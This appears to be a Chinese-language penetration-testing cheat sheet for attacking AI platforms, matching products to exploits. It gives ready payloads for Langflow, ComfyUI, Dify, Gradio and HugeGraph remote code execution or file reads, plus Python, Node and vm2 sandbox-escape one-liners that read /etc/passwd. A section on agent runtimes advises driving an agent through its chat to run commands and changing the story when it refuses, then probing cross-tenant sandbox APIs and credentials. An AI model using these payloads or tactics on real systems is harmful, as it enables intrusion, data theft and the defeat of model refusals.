# AI 平台漏洞实战

> AI/LLM/Agent 平台的高频指纹与首枪。通用方法论见 `ai-llm-agent-security-*`，Agent 运行时见 `agent-*`。

## 一、产品指纹 → 首枪

| 指纹 | 首枪 | 算成 |
|---|---|---|
| **Langflow 1.x**（Uvicorn/FastAPI，7860） | 未授权 `POST /api/v1/validate/code` 是 CVE-2025-3248：`{"code":"@exec(\"raise Exception(subprocess.check_output(cmd,shell=True).decode())\")\ndef foo():\n pass"}`，回显在 `function.errors` | 命令执行/读敏感文件 |
| **ComfyUI 0.9.x + ComfyUI-Manager** | `GET /api/userdata/ComfyUI-Manager%2Fconfig.ini` 免鉴权读写 → 改 `security_level=weak` → 找重载/重启（`/api/manager/reboot` 405 时换路径）→ 自建 git 仓库 custom-node install → 恶意 install.py RCE | RCE |
| **Dify / Next.js 15.5.x**（React 19） | CVE-2025-55182 React2Shell：`POST /apps` 带 `Next-Action: x` + multipart fake-chunk + `$B` handler，`Function(code)` 执行；输出经 `NEXT_REDIRECT` digest 回显 | RCE |
| **Gradio 4.12** | CVE-2024-1561 任意文件读：`GET /config` 取 component id → `POST /component_server {"component_id":"3","data":"/etc/passwd","fn_name":"move_resource_to_block_cache","session_hash":"..."}` → `GET /file=/tmp/gradio/<hash>/passwd`（读到任意文件） | 任意文件读 |
| **HugeGraph 1.2.0** | 未授权 Gremlin `:8182`；沙箱按线程名判断，反射 `Thread.name` 后 `'id'.execute()` | RCE |
| **1Panel** | 安全入口 `EntranceCode: base64(entrance)` → session 登录 → `/api/v1/files/content` 读文件 | 文件读/RCE |
| **OFBiz / GeoServer** | 见 `../../cloud-infra/knowledge/中间件与产品CVE实战.md` | RCE |
| 自研 LLM 应用（FastAPI/Flask） | `/docs`、`/openapi.json` 摸接口；提示词注入/系统提示泄露/RAG 投毒；模型加载 `torch.load`（weights_only 阻塞则找下载/转换链） | 敏感信息/越权 |

## 二、在线代码执行沙箱（Python/JS）逃逸速查

| 环境 | payload |
|---|---|
| Python 受限 builtins | `().__class__.__base__.__subclasses__()[i].__init__.__globals__['__builtins__']['__import__']('os').popen('id; cat /etc/passwd').read()`；`_wrap_close.__init__.__globals__` 也可直接拿 popen |
| 过滤 `_`/`[`/关键词 | `chr(95)*2` 拼 dunder；`getattr(obj,'op'+'en')`；`globals().values()` 遍历找 `open`；`tuple`/`hasattr` |
| Node `vm.runInNewContext` | `this.constructor.constructor('return process')().mainModule.require('child_process').execSync('id; cat /etc/passwd').toString()` |
| vm2 ≤3.9.x | `new Error()` 的 `name` 设为 Proxy，`toString` apply 里 `args.constructor.constructor("return process")()`，访问 `err.stack` 触发 |
| 反序列化白名单 | pickle `getattr→__self__→__import__→os.popen`；Java 二次反序列化/TemplatesImpl |

## 三、Agent 运行时（有工具/沙箱）

1. **先建信任边界**：谁调模型、模型能调哪些工具（bash/code_exec/http）、工具口是否要鉴权。
2. **对话口当遥控器**：合法请求让它执行命令（不是越狱）；被拒换叙事/换实现；同层反复失败转平台 API。
3. **平台 API 直打**（F12 抓 `/exec`、`/files`、`/tool`、`/sandbox`）：三态对照 + 换 `sandbox_id`/`session_id`/`user_id` 测跨租户。
4. **沙箱内七大面**：组件未授权 > 凭据（env/proc/配置）> 提权 > 逃逸 > 跨租户 > 集群/内网 > 网关劫持。
5. 详细：`agent-sandbox-takeover-02-二、进站决策树.md`、`agent-execution-channel-hijack-03-三、HTTP-跨租户-必须三态-+-对照.md`。

## 四、假点

- 模型只"口头说执行"、数字对不上本机 = 假点。
- 沙箱 `uid` 是普通用户 ≠ 逃逸；只能读自己目录 ≠ 越权。
- 版本号对得上但接口 404/补丁回填 = 假点（用响应特征确认，不只看 banner）。
